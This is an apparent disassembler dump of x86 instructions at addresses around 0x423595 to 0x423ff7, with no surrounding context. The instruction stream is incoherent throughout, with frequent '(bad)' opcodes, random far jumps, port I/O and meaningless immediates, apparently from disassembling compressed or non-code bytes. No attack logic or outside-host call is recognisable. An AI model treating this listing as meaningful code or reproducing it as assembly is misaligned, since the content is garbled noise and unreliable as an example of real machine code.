  423595:	ds mov al,0xf1
  423598:	pop    ds
  423599:	mov    BYTE PTR [ebx+edx*4],bh
  42359c:	mov    esi,0xff7fea58
  4235a1:	mov    ebp,0x57687382
  4235a6:	fild   QWORD PTR [edi+0x4e32da61]
  4235ac:	cmp    BYTE PTR [ebp+0x70],ch
  4235af:	mov    eax,DWORD PTR [ecx+eiz*8]
  4235b2:	mov    al,0x83
  4235b4:	inc    ebx
  4235b5:	(bad)  
  4235b6:	fld    st(2)
  4235b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235b9:	test   BYTE PTR [edx+edi*4-0x5c],dh
  4235bd:	xchg   esp,eax
  4235be:	rcr    BYTE PTR [edx+ebp*4+0x40a40642],cl
  4235c5:	fucomp st(5)
  4235c7:	and    DWORD PTR [esi-0x2c86e9d8],0xfb420fab
  4235d1:	in     al,dx
  4235d2:	mov    ecx,0x86cd6921
  4235d7:	mov    DWORD PTR [ebx-0x3c],edx
  4235da:	les    edx,FWORD PTR [esi+0x37]
  4235dd:	xchg   esi,eax
  4235de:	pop    edx
  4235df:	jmp    ebx
  4235e1:	int3   
  4235e2:	fdivr  DWORD PTR [edi+esi*8+0x21964b40]
  4235e9:	sub    al,0x70
  4235eb:	mov    gs,WORD PTR [edx-0x50]
  4235ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235ef:	mov    ah,0x94
  4235f1:	inc    esi
  4235f2:	mov    edi,0xd197ff14
  4235f7:	fidivr DWORD PTR [eax+0x427aabca]
  4235fd:	adc    BYTE PTR [ebx+ecx*2+0x70d2918d],bl
  423604:	in     al,0xf3
  423606:	jo     0x42365a
  423608:	add    BYTE PTR [ebx+0x36],dh
  42360b:	test   DWORD PTR [eax-0x6d],ebp
  42360e:	fcomp  QWORD PTR fs:[edx+0x11]
  423612:	jo     0x42368a
  423614:	sbb    al,0x46
  423616:	and    al,0xde
  423618:	sbb    ebx,edi
  42361a:	fisubr WORD PTR [edx-0x69]
  42361d:	not    BYTE PTR [esi-0x7dd50e61]
  423623:	xchg   ebx,eax
  423624:	out    0x52,al
  423626:	scas   eax,DWORD PTR es:[edi]
  423627:	scas   al,BYTE PTR es:[edi]
  423628:	jp     0x4235d3
  42362a:	sbb    eax,esp
  42362c:	sbb    al,0x57
  42362e:	mov    ?,WORD PTR [eax]
  423630:	pop    ecx
  423631:	mov    ebp,0xfa43588a
  423636:	adc    eax,0x7c0d2dfd
  42363b:	ins    DWORD PTR es:[edi],dx
  42363c:	xor    ebp,0xffffffcf
  42363f:	js     0x423613
  423641:	adc    eax,0x4a5d6d7d
  423646:	jmp    0xc0b97a48
  42364b:	mov    WORD PTR [edx],ss
  42364d:	pop    es
  42364e:	popf   
  42364f:	inc    esp
  423650:	jmp    0x1937:0x60d7751d
  423657:	retf   
  423658:	or     esi,edx
  42365a:	(bad)  [esi+edi*1+0x44075ae3]
  423661:	cmp    bh,cl
  423663:	repnz pop ebx
  423665:	stos   DWORD PTR es:[edi],eax
  423666:	inc    edi
  423667:	int3   
  423668:	in     eax,0x87
  42366a:	lock das 
  42366c:	dec    eax
  42366d:	push   esi
	...
  4236d6:	or     BYTE PTR [edi-0x8808b84],0x88
  4236dd:	jmp    FWORD PTR [esi-0x6f]
  4236e0:	jl     0x4236f5
  4236e2:	pop    ebp
  4236e3:	inc    esi
  4236e4:	(bad)  
  4236e5:	outs   dx,DWORD PTR ds:[esi]
  4236e6:	addr16 jl 0x4236ea
  4236e9:	add    BYTE PTR [eax],al
  4236eb:	add    DWORD PTR [eax],eax
  4236ed:	add    BYTE PTR [edi-0x1b489bac],bh
  4236f3:	sub    eax,DWORD PTR [ebx+0x6]
  4236f6:	adc    bh,ah
  4236f8:	push   edx
  4236f9:	sbb    DWORD PTR [ebx-0x29925701],esp
  4236ff:	jns    0x42373b
  423701:	inc    esp
  423702:	shr    DWORD PTR [eax],cl
  423704:	cmc    
  423705:	in     al,0x67
  423707:	inc    edi
  423708:	pop    esp
  423709:	jmp    0x3b33:0xb25aed2f
  423710:	push   ebp
  423711:	arpl   si,bx
  423713:	push   edx
  423714:	ds fcmovu st,st(4)
  423717:	xchg   esp,eax
  423718:	jg     0x4236d2
  42371a:	add    DWORD PTR [ecx-0x70],ebp
  42371d:	add    dh,BYTE PTR [eax-0x3719d368]
  423723:	leave  
  423724:	cmp    al,0x1
  423726:	es push eax
  423728:	cmp    al,0xa1
  42372a:	jmp    FWORD PTR [esi]
  42372c:	add    BYTE PTR [ecx],dl
  42372e:	test   BYTE PTR [esi],cl
  423730:	gs fdivr st(3),st
  423733:	jmp    0x3582:0x2b7b33c
  42373a:	int    0x17
  42373c:	aas    
  42373d:	pushf  
  42373e:	iret   
  42373f:	adc    DWORD PTR [ecx+0x75dad60],eax
  423745:	test   ch,ch
  423747:	or     dh,BYTE PTR [edx-0x56]
  42374a:	fisub  DWORD PTR [ebx]
  42374c:	mov    bh,BYTE PTR [esi]
  42374e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42374f:	scas   eax,DWORD PTR es:[edi]
  423750:	mov    esp,0xe0f72497
  423755:	push   esp
  423756:	mov    ecx,0x288b32bc
  42375b:	scas   al,BYTE PTR es:[edi]
  42375c:	test   DWORD PTR [ebx],ebp
  42375e:	cmp    eax,esp
  423760:	mov    WORD PTR [ebx+esi*8],ss
  423763:	sub    al,0xe8
  423765:	jno    0x423711
  423767:	mov    ch,0x44
  423769:	xchg   esi,eax
  42376a:	fwait
  42376b:	cli    
  42376c:	push   ecx
  42376d:	rcl    BYTE PTR [ecx],1
  42376f:	les    edx,FWORD PTR ds:0x8990e876
  423775:	adc    al,0x7d
  423777:	ret    0x3d83
  42377a:	inc    ebp
  42377b:	mov    ecx,0x69222a2b
  423780:	inc    ecx
  423781:	lahf   
  423782:	jo     0x423786
  423784:	cmp    bl,al
  423786:	fcomp  DWORD PTR [ebp-0x3f]
  423789:	push   eax
  42378a:	in     al,dx
  42378b:	aad    0xf9
  42378d:	or     eax,0x6199eec5
  423792:	iret   
  423793:	cmp    DWORD PTR [edx+0xe3e0775],ecx
  423799:	xchg   ebx,eax
  42379a:	xchg   esi,eax
  42379b:	(bad)  
  42379c:	pop    ebx
  42379d:	mov    esi,DWORD PTR [ebp+0x60198717]
  4237a3:	outs   dx,BYTE PTR ds:[esi]
  4237a4:	imul   eax,DWORD PTR [ebx-0x3f],0xfffffffd
  4237a8:	pop    eax
  4237a9:	std    
  4237aa:	cdq    
  4237ab:	(bad)  
  4237ac:	jae    0x4237ab
  4237ae:	jmp    0xee3f:0x2ef290db
  4237b5:	mov    ah,0x7b
  4237b7:	inc    eax
  4237b8:	imul   edx,DWORD PTR [edi],0xfffffffc
  4237bb:	push   ss
  4237bc:	loope  0x4237ca
  4237be:	inc    esi
  4237bf:	push   0xffffffa6
  4237c1:	xor    eax,0xf2221706
  4237c6:	xor    eax,0x129c329
  4237cb:	psubsw mm2,QWORD PTR [edi-0x46]
  4237cf:	jno    0x423766
  4237d1:	xchg   esp,eax
  4237d2:	loope  0x423809
  4237d4:	repnz sub DWORD PTR [edx-0x1378624d],0x0
  4237dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237dd:	sbb    ecx,ebp
  4237df:	mov    eax,DWORD PTR [ecx+0x1b]
  4237e2:	das    
  4237e3:	xchg   ecx,eax
  4237e4:	int3   
  4237e5:	(bad)  
  4237e7:	call   0x235c307a
  4237ec:	paddsb mm0,QWORD PTR [eax]
	...
  423853:	add    BYTE PTR [eax],al
  423855:	add    BYTE PTR [ebx+eiz*1],dh
  423858:	jo     0x4237f7
  42385a:	ja     0x42383b
  42385c:	std    
  42385d:	stos   DWORD PTR es:[edi],eax
  42385e:	(bad)  
  42385f:	sbb    edx,esi
  423861:	jmp    0x7d67:0xe4415c87
  423868:	add    DWORD PTR [eax],eax
  42386a:	add    BYTE PTR [ecx],al
  42386c:	add    BYTE PTR [eax],al
  42386e:	(bad)  
  42386f:	dec    ecx
  423870:	daa    
  423871:	xchg   esp,eax
  423872:	lock ret 
  423874:	pop    eax
  423875:	push   cs
  423876:	mov    dl,0x67
  423878:	sbb    edi,ebx
  42387a:	out    0xa,eax
  42387c:	in     al,dx
  42387d:	xor    DWORD PTR [esp+eax*2-0x55],ecx
  423881:	stos   DWORD PTR es:[edi],eax
  423882:	data16 repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423885:	imul   ecx,DWORD PTR [edi-0x1526f3dd],0xffffffc0
  42388c:	sbb    BYTE PTR [ebp-0x4b],dl
  42388f:	xchg   ebx,eax
  423890:	jmp    0xfeb4:0x10ab7126
  423897:	data16 (bad) 
  423899:	xor    eax,0xf698c0b5
  42389e:	jno    0x4238e5
  4238a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238a2:	jnp    0x4238c6
  4238a4:	xchg   esp,eax
  4238a5:	js     0x42382e
  4238a7:	hlt    
  4238a8:	ret    0xfa55
  4238ab:	mov    ebp,0xedb436ac
  4238b0:	push   es
  4238b1:	inc    eax
  4238b2:	dec    edi
  4238b3:	cmp    al,0x2a
  4238b5:	ror    DWORD PTR [ecx+esi*8+0x2e],0x4d
  4238ba:	xchg   esp,eax
  4238bb:	dec    edi
  4238bc:	sub    eax,0xfec7078
  4238c1:	jmp    0x5c26:0x521564bc
  4238c8:	out    0xdf,eax
  4238ca:	ret    
  4238cb:	pop    ss
  4238cc:	lahf   
  4238cd:	cmp    BYTE PTR [eax+eax*8+0x40baee92],bl
  4238d4:	pop    ebx
  4238d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238d6:	sbb    BYTE PTR [ebx+0x2d],ah
  4238d9:	test   BYTE PTR [ecx-0x274bceb7],bh
  4238df:	aaa    
  4238e0:	jnp    0x4238d3
  4238e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238e3:	stos   BYTE PTR es:[edi],al
  4238e4:	add    DWORD PTR [ebx+0x616002ce],ebx
  4238ea:	jnp    0x423870
  4238ec:	cmp    al,0x17
  4238ee:	shl    BYTE PTR [edi+ebx*2],1
  4238f1:	cmp    esi,esp
  4238f3:	dec    ecx
  4238f4:	add    DWORD PTR [esi+0x4dd65c7f],ebp
  4238fa:	lock (bad) 
  4238fc:	sbb    BYTE PTR cs:[eax-0xa],ch
  423900:	sub    DWORD PTR [eax-0x4f6478d0],0xa708dc8d
  42390a:	pop    ss
  42390b:	stc    
  42390c:	push   0xffffffd1
  42390e:	mov    bh,0xb6
  423910:	fstp   TBYTE PTR [eax]
  423912:	inc    edx
  423913:	retf   0xaa36
  423916:	icebp  
  423917:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423918:	sub    esp,DWORD PTR [ebx]
  42391a:	mov    edx,0x31fa99b3
  42391f:	in     eax,0xea
  423921:	ficomp WORD PTR [edi+eax*1]
  423924:	mov    cl,0xe3
  423926:	call   0x4acb:0xbe216590
  42392d:	mov    ah,0x1d
  42392f:	sub    BYTE PTR [esi],al
  423931:	xchg   DWORD PTR [ebx+edi*4-0x70eef982],ebp
  423938:	loope  0x423984
  42393a:	sub    al,0x42
  42393c:	sub    al,0xa3
  42393e:	push   ss
  42393f:	dec    edi
  423940:	rcr    ebx,cl
  423942:	jne    0x423901
  423944:	sub    eax,0x4cf1c6a5
  423949:	mov    WORD PTR ds:0xc9891bed,ss
  42394f:	mov    ch,BYTE PTR [esp+edx*1-0x80]
  423953:	jp     0x4238e2
  423955:	adc    eax,0xcde8f639
  42395a:	test   ch,bh
  42395c:	ror    DWORD PTR [ecx+0x15],0x55
  423960:	stc    
  423961:	lods   eax,DWORD PTR ds:[esi]
  423962:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423963:	inc    ecx
  423964:	add    eax,0x1f0230de
  423969:	call   0x0:0x73fec7f9
	...
  4239d4:	add    BYTE PTR [eax],al
  4239d6:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  4239dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239de:	push   ecx
  4239df:	sbb    eax,0x75f52bbd
  4239e4:	lea    ebp,[edi+0x67]
  4239e7:	jle    0x4239ea
  4239e9:	add    BYTE PTR [eax],al
  4239eb:	add    DWORD PTR [eax],eax
  4239ed:	add    bl,al
  4239ef:	outs   dx,DWORD PTR ds:[esi]
  4239f0:	retf   0xf126
  4239f3:	mov    esi,0xc6071efc
  4239f8:	and    eax,0x355ae028
  4239fd:	sbb    ah,0x5f
  423a00:	mov    ebp,ebx
  423a02:	in     al,dx
  423a03:	mov    al,0x4f
  423a05:	adc    eax,0x3c30a187
  423a0a:	mov    ah,0x89
  423a0c:	cmp    ebx,DWORD PTR [ebp+0x13a0d873]
  423a12:	leave  
  423a13:	pavgw  mm3,QWORD PTR [edi-0x5964c262]
  423a1a:	mov    bl,0x37
  423a1c:	test   al,0x77
  423a1e:	scas   al,BYTE PTR es:[edi]
  423a1f:	not    BYTE PTR [ecx+0x5c2ffbd1]
  423a25:	lods   eax,DWORD PTR ds:[esi]
  423a26:	fdivr  st(2),st
  423a28:	int3   
  423a29:	jnp    0x4239eb
  423a2b:	(bad)  
  423a2c:	jno    0x423a71
  423a2e:	scas   al,BYTE PTR es:[edi]
  423a2f:	or     BYTE PTR [edi],cl
  423a31:	xor    DWORD PTR [esi+0x45c30b6a],0x2dd576bb
  423a3b:	imul   ecx,DWORD PTR [esi],0xac0d7d02
  423a41:	fstp   QWORD PTR [ebp+0x5d]
  423a44:	sub    al,0x7
  423a46:	int3   
  423a47:	sub    DWORD PTR [edx+eiz*4],ecx
  423a4a:	fcomp  st(2)
  423a4c:	adc    eax,0xc1e4321
  423a51:	sar    DWORD PTR [esi],0xfa
  423a54:	dec    BYTE PTR [ecx-0x46]
  423a57:	inc    edi
  423a58:	out    dx,al
  423a59:	sbb    cl,ch
  423a5b:	leave  
  423a5c:	mov    ch,0xad
  423a5e:	inc    ebp
  423a5f:	scas   eax,DWORD PTR es:[edi]
  423a60:	inc    esi
  423a61:	nop
  423a62:	iret   
  423a63:	inc    esp
  423a64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a65:	shr    cl,cl
  423a67:	push   edi
  423a68:	test   BYTE PTR [esi+0x259d2e2d],ah
  423a6e:	cwde   
  423a6f:	mov    eax,ds:0x456e2061
  423a74:	into   
  423a75:	scas   eax,DWORD PTR es:[edi]
  423a76:	mov    ebp,0x4caa1d07
  423a7b:	in     eax,dx
  423a7c:	hlt    
  423a7d:	xchg   DWORD PTR [ecx-0x38],ecx
  423a80:	jmp    0x423aea
  423a82:	jecxz  0x423a1e
  423a84:	dec    eax
  423a85:	fwait
  423a86:	lea    esi,[ebp-0x477ca678]
  423a8c:	adc    al,0x43
  423a8e:	dec    edx
  423a8f:	(bad)  
  423a90:	mov    ebp,0xf0493c30
  423a95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a96:	xchg   edx,eax
  423a97:	mov    bl,0x98
  423a99:	adc    ebp,DWORD PTR [ebx+eiz*2+0x35d325f8]
  423aa0:	sbb    cl,BYTE PTR [ebp+0x3ae0983f]
  423aa6:	and    BYTE PTR [edx],al
  423aa8:	ss jne 0x423a96
  423aab:	cdq    
  423aac:	jno    0x423a39
  423aae:	jle    0x423abf
  423ab0:	cs sti 
  423ab2:	in     eax,0xb1
  423ab4:	out    0xcc,al
  423ab6:	retf   
  423ab7:	sbb    DWORD PTR [ebx+0x3c],ecx
  423aba:	push   edi
  423abb:	pusha  
  423abc:	mov    esi,0x1af4d35f
  423ac1:	xchg   BYTE PTR [ebx-0x48],dl
  423ac4:	and    ebx,DWORD PTR [eax+0x6a]
  423ac7:	and    eax,0xd0422676
  423acc:	outs   dx,BYTE PTR ds:[esi]
  423acd:	rol    BYTE PTR [esp+esi*1],0x33
  423ad1:	push   ebx
  423ad2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ad3:	adc    dl,BYTE PTR [edi-0x57336690]
  423ad9:	stos   BYTE PTR es:[edi],al
  423ada:	xlat   BYTE PTR ds:[ebx]
  423adb:	aad    0x80
  423add:	imul   BYTE PTR [ebx+0x41ca29c9]
  423ae3:	cld    
  423ae4:	jae    0x423b4c
  423ae6:	lahf   
  423ae7:	xchg   ebp,eax
  423ae8:	dec    ebx
  423ae9:	push   esp
  423aea:	(bad)  
  423aeb:	js     0x423ae6
  423aed:	mov    al,BYTE PTR [eax]
	...
  423b53:	add    BYTE PTR [eax],al
  423b55:	add    BYTE PTR [eax],dh
  423b57:	cmp    eax,0xdf7d9f75
  423b5c:	cli    
  423b5d:	mov    edi,0x60851ed8
  423b62:	das    
  423b63:	gs xchg ebp,eax
  423b65:	out    dx,eax
  423b66:	addr16 jg 0x423b6a
  423b69:	add    BYTE PTR [eax],al
  423b6b:	add    DWORD PTR [eax],eax
  423b6d:	add    BYTE PTR [eax+ebp*8+0x8459d62],dh
  423b74:	push   0xffffff94
  423b76:	xor    al,BYTE PTR [edi+ebp*8+0x664aeb17]
  423b7d:	xor    al,BYTE PTR [ebx]
  423b7f:	aas    
  423b80:	outs   dx,DWORD PTR ds:[esi]
  423b81:	add    dl,BYTE PTR [ebp-0x7e]
  423b84:	mov    esi,0x76c3c36b
  423b89:	icebp  
  423b8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b8b:	or     edi,DWORD PTR [ecx+0x1bd80011]
  423b91:	repz leave 
  423b93:	mov    cl,BYTE PTR [eax]
  423b95:	sub    esp,edx
  423b97:	in     eax,0x52
  423b99:	inc    esi
  423b9a:	jno    0x423b61
  423b9c:	jmp    0xf489f6d9
  423ba1:	rcr    BYTE PTR [edi+eiz*1-0x7311dcc1],0x60
  423ba9:	xor    al,0x18
  423bab:	imul   ebx,DWORD PTR [ebp+eax*1-0x5c2ac7ed],0xbebe9ae7
  423bb6:	sbb    eax,0xa7929bb2
  423bbb:	mov    ecx,0xbe1bf71b
  423bc0:	loop   0x423b7b
  423bc2:	retf   0x685f
  423bc5:	push   esp
  423bc6:	jle    0x423bf2
  423bc8:	mov    al,0xc9
  423bca:	into   
  423bcb:	pop    esi
  423bcc:	pop    ds
  423bcd:	or     DWORD PTR [edx+0xfc586e7],0x47
  423bd4:	outs   dx,BYTE PTR ds:[esi]
  423bd5:	jp     0x423be2
  423bd7:	sbb    eax,DWORD PTR ds:[esi]
  423bda:	lods   al,BYTE PTR ds:[esi]
  423bdb:	ret    
  423bdc:	inc    esp
  423bdd:	(bad)
  423be1:	mov    ebx,0x7d98627a
  423be6:	aas    
  423be7:	jns    0x423bdb
  423be9:	fsubr  QWORD PTR [edx]
  423beb:	and    esi,DWORD PTR [edi+0x63]
  423bee:	cmp    ebx,DWORD PTR [ebx]
  423bf0:	les    ebp,FWORD PTR [esi+ecx*1+0x7037c333]
  423bf7:	lds    ebp,FWORD PTR [eax-0x648e78e1]
  423bfd:	adc    eax,edi
  423bff:	stos   BYTE PTR es:[edi],al
  423c00:	jmp    0x423b85
  423c02:	push   0xc582bf0b
  423c07:	dec    edi
  423c08:	mov    eax,0xeeb1508d
  423c0d:	bnd jg 0x423c4b
  423c10:	cdq    
  423c11:	repz daa 
  423c13:	mov    ebx,0x9334dd22
  423c18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c19:	lods   al,BYTE PTR ds:[esi]
  423c1a:	aas    
  423c1b:	je     0x423c8e
  423c1d:	pop    es
  423c1e:	dec    ebp
  423c1f:	sub    esp,DWORD PTR [ebp-0x7a]
  423c22:	xor    eax,0xb4ff2c21
  423c27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c28:	mov    bl,0xeb
  423c2a:	cli    
  423c2b:	xchg   edx,eax
  423c2c:	mov    bl,0xaf
  423c2e:	push   0x230b0b1b
  423c33:	xchg   BYTE PTR [eax+0x660c851e],dh
  423c39:	mov    eax,ds:0x20a38869
  423c3e:	add    BYTE PTR [edi],ch
  423c40:	pop    esp
  423c41:	xadd   BYTE PTR [ebp+0x788bdbcf],bl
  423c48:	mov    edi,0xeb3f21be
  423c4d:	icebp  
  423c4e:	cmc    
  423c4f:	add    esi,ecx
  423c51:	cs retf 
  423c53:	cmp    BYTE PTR [edx+0x47],dl
  423c56:	adc    BYTE PTR [edi-0x64],al
  423c59:	hlt    
  423c5a:	xlat   BYTE PTR ds:[ebx]
  423c5b:	xor    BYTE PTR [ecx-0x112d5fe7],al
  423c61:	jmp    0xab2bc54b
  423c66:	mov    DWORD PTR [ecx+edx*8],edx
  423c69:	xor    DWORD PTR [esi+0x15],0x6e86
	...
  423cd4:	add    BYTE PTR [eax],al
  423cd6:	std    
  423cd7:	(bad)  
  423cd8:	test   eax,0xff57ab46
  423cdd:	call   FWORD PTR [eax-0x1fbb99e9]
  423ce3:	adc    edx,DWORD PTR [ebx]
  423ce5:	or     al,0x67
  423ce7:	add    BYTE PTR [ecx],0x0
  423cea:	add    BYTE PTR [ecx],al
  423cec:	add    BYTE PTR [eax],al
  423cee:	mov    bl,0xf8
  423cf0:	pusha  
  423cf1:	cli    
  423cf2:	mov    WORD PTR [eax-0x30030aa9],es
  423cf8:	sbb    DWORD PTR [esi-0x34],esp
  423cfb:	xchg   esp,eax
  423cfc:	les    edx,FWORD PTR [ebp+edi*2+0x4d]
  423d00:	imul   ecx,edi,0x12
  423d03:	loopne 0x423cf1
  423d05:	scas   al,BYTE PTR es:[edi]
  423d06:	jmp    0x423d4b
  423d08:	aas    
  423d09:	pop    esi
  423d0a:	mov    dl,0x5a
  423d0c:	mov    ecx,0xa48b0c34
  423d11:	push   esi
  423d12:	add    al,0x5d
  423d14:	pushf  
  423d15:	data16 (bad) 
  423d17:	mov    ah,0x6e
  423d19:	mov    bh,0xfe
  423d1b:	mov    edx,0xa1c794a4
  423d20:	push   esp
  423d21:	dec    eax
  423d22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d23:	xor    DWORD PTR [ecx+edx*1-0xedddbc6],edx
  423d2a:	fmul   DWORD PTR [edi+0x10]
  423d2d:	test   BYTE PTR [esi-0x5d35fd2b],0x8
  423d34:	and    eax,0xcd3feea4
  423d39:	mov    cl,0x37
  423d3b:	jmp    0x6401d751
  423d40:	mov    ds:0xa2a173c6,al
  423d45:	lea    ebp,[eax-0x14f15335]
  423d4b:	pop    eax
  423d4c:	push   es
  423d4d:	dec    eax
  423d4e:	fld    QWORD PTR [eax-0x6e]
  423d51:	pop    ss
  423d52:	add    dl,BYTE PTR [edx]
  423d54:	js     0x423d0c
  423d56:	add    al,0x47
  423d58:	mov    al,ds:0xafcdc4ea
  423d5d:	and    BYTE PTR [edx-0x6d],dl
  423d60:	nop
  423d61:	jecxz  0x423cf8
  423d63:	(bad)  
  423d64:	add    BYTE PTR [esi+0x56],al
  423d67:	add    BYTE PTR [eax-0x4],al
  423d6a:	out    dx,eax
  423d6b:	rcr    dl,1
  423d6d:	ror    DWORD PTR [edx+eax*1],1
  423d70:	(bad)  
  423d74:	and    edi,DWORD PTR [esi]
  423d76:	mov    ah,BYTE PTR [ebx+ebp*8+0x54]
  423d7a:	jno    0x423d5c
  423d7c:	cwde   
  423d7d:	pop    eax
  423d7e:	inc    ecx
  423d7f:	loopne 0x423dc9
  423d81:	pusha  
  423d82:	cmp    dl,cl
  423d84:	cmp    bl,dh
  423d86:	or     edi,DWORD PTR [eax+0x3d]
  423d89:	and    dh,BYTE PTR [edi]
  423d8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d8c:	ins    BYTE PTR es:[edi],dx
  423d8d:	ficomp DWORD PTR [eax-0x38]
  423d90:	adc    esi,ebp
  423d92:	out    dx,al
  423d93:	push   ds
  423d94:	jmp    0x2901f16a
  423d99:	mov    esp,0xf17712fc
  423d9e:	jmp    0x1071cc0
  423da3:	test   cl,ah
  423da5:	loop   0x423df6
  423da7:	mov    edx,0x1a4aaa22
  423dac:	jmp    0x5561ac89
  423db1:	add    eax,0xe56bdd1e
  423db6:	test   eax,0xe3eb4e5
  423dbb:	bound  edx,QWORD PTR [ecx-0x7acdd3bc]
  423dc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423dc2:	inc    esi
  423dc3:	mov    dh,al
  423dc5:	nop
  423dc6:	mov    cs,WORD PTR [edx+0x49]
  423dc9:	les    ebx,FWORD PTR [ebp-0x76]
  423dcc:	inc    edi
  423dcd:	idiv   DWORD PTR [ecx]
  423dcf:	imul   esp,DWORD PTR [ebx-0xa],0xd2106bde
  423dd6:	pop    ss
  423dd7:	inc    DWORD PTR [ebp+0x61]
  423dda:	call   0x6832:0x1758e7cc
  423de1:	push   ds
  423de2:	hlt    
  423de3:	int    0x87
  423de5:	sti    
  423de6:	gs js  0x423e66
  423de9:	dec    esp
  423dea:	and    BYTE PTR [edx-0x4f],0x6c
	...
  423e56:	(bad)  
  423e57:	test   BYTE PTR [edi-0x118668f7],0xff
  423e5e:	daa    
  423e5f:	mov    DWORD PTR [eax+0x28f9fbd2],esp
  423e65:	pop    ecx
  423e66:	add    DWORD PTR [bx+di],0x10000
  423e6d:	add    BYTE PTR [esi-0x3ef5813d],al
  423e73:	ins    DWORD PTR es:[edi],dx
  423e74:	dec    edi
  423e75:	adc    DWORD PTR [edi+esi*4+0x330240b8],0x5ebc3e13
  423e80:	mov    ecx,0x3e511bd
  423e85:	push   ecx
  423e86:	shr    al,cl
  423e88:	arpl   WORD PTR [esi-0x3d],ax
  423e8b:	adc    al,0x50
  423e8d:	out    dx,eax
  423e8e:	jecxz  0x423ed1
  423e90:	add    BYTE PTR [ebx-0xb],ah
  423e93:	cdq    
  423e94:	sbb    BYTE PTR [esp+ebp*1],bh
  423e97:	or     DWORD PTR [edx-0x34],eax
  423e9a:	test   al,0xf1
  423e9c:	nop
  423e9d:	das    
  423e9e:	std    
  423e9f:	jno    0x423e51
  423ea1:	or     dl,BYTE PTR [edi]
  423ea3:	imul   ebx,DWORD PTR [edx+ecx*2],0xffffffa8
  423ea7:	mov    edi,DWORD PTR [ebx+ecx*2]
  423eaa:	shr    BYTE PTR [ebx-0x7385b2e9],0x8f
  423eb1:	lods   eax,DWORD PTR ds:[esi]
  423eb2:	inc    esp
  423eb3:	pusha  
  423eb4:	add    eax,0x4b90f630
  423eb9:	pushf  
  423eba:	mov    bh,0xda
  423ebc:	mov    bh,0x86
  423ebe:	cmp    eax,0xa05f395b
  423ec3:	add    BYTE PTR [esi-0x30ef61de],ah
  423ec9:	or     bh,BYTE PTR [esp+ecx*2]
  423ecc:	pushf  
  423ecd:	sahf   
  423ece:	out    0xcf,al
  423ed0:	(bad)  
  423ed1:	or     esi,DWORD PTR [edi-0x528c5367]
  423ed7:	aad    0x26
  423ed9:	lods   al,BYTE PTR ds:[esi]
  423eda:	push   es
  423edb:	sar    DWORD PTR [eax],0x7f
  423ede:	mov    ecx,DWORD PTR [esi]
  423ee0:	and    edi,DWORD PTR [edi+0x71]
  423ee3:	adc    BYTE PTR [ecx],ah
  423ee5:	mov    ebx,0xc6cc4534
  423eea:	add    ch,ch
  423eec:	mov    bl,0xba
  423eee:	mov    ds:0xa1640a7c,eax
  423ef3:	fisttp DWORD PTR [ecx]
  423ef5:	mov    ch,0xa
  423ef7:	lods   eax,DWORD PTR ds:[esi]
  423ef8:	in     eax,dx
  423ef9:	xor    DWORD PTR [esi-0x58],ecx
  423efc:	inc    ebp
  423efd:	cmc    
  423efe:	jg     0x423ecc
  423f00:	pop    ecx
  423f01:	sahf   
  423f02:	jecxz  0x423eeb
  423f04:	cs jno 0x423f25
  423f07:	jl     0x423eb1
  423f09:	iret   
  423f0a:	rol    BYTE PTR [ecx],0xb3
  423f0d:	mov    ecx,ebp
  423f0f:	dec    ecx
  423f10:	sar    DWORD PTR [ecx],0x5d
  423f13:	add    BYTE PTR [esi],dl
  423f15:	retf   
  423f16:	mov    WORD PTR [eax],?
  423f18:	mov    ds:0xed6d8030,al
  423f1d:	xor    al,0x7c
  423f1f:	(bad)  
  423f20:	mov    dl,0x9e
  423f22:	adc    al,0x58
  423f24:	je     0x423f4e
  423f26:	js     0x423fa3
  423f28:	in     eax,0x90
  423f2a:	imul   esi,edx,0xffffffe2
  423f2d:	or     eax,0x7c642ad6
  423f32:	jmp    0x393b4209
  423f37:	aad    0xfe
  423f39:	mov    ecx,0x60734a1d
  423f3e:	sahf   
  423f3f:	rol    esp,1
  423f41:	sbb    BYTE PTR fs:[ebx+0x38b359bc],dl
  423f48:	cmp    edx,DWORD PTR [eax]
  423f4a:	and    eax,0x1b15a54b
  423f4f:	mov    ds:0x80087cec,ax
  423f55:	inc    ecx
  423f56:	sbb    DWORD PTR [ebx],0x10951b0e
  423f5c:	popf   
  423f5d:	jb     0x423fb2
  423f5f:	lods   ax,WORD PTR ds:[esi]
  423f61:	or     al,0x10
  423f63:	lock xor al,0xd3
  423f66:	(bad)  
  423f67:	or     al,0x1b
  423f69:	outs   dx,DWORD PTR ds:[esi]
  423f6a:	(bad)  
  423f6b:	scas   eax,DWORD PTR es:[edi]
  423f6c:	outs   dx,DWORD PTR ds:[esi]
  423f6d:	inc    ebp
	...
  423fd6:	scas   al,BYTE PTR es:[edi]
  423fd7:	call   0x9fff:0xff74b964
  423fde:	adc    al,0x96
  423fe0:	sbb    al,0xd9
  423fe2:	arpl   WORD PTR [edi-0x7d98b14e],bp
  423fe8:	add    DWORD PTR [eax],eax
  423fea:	add    BYTE PTR [ecx],al
  423fec:	add    BYTE PTR [eax],al
  423fee:	pop    ecx
  423fef:	mov    BYTE PTR ds:0x9880849,bh
  423ff5:	adc    al,0x60
  423ff7:	pushf  
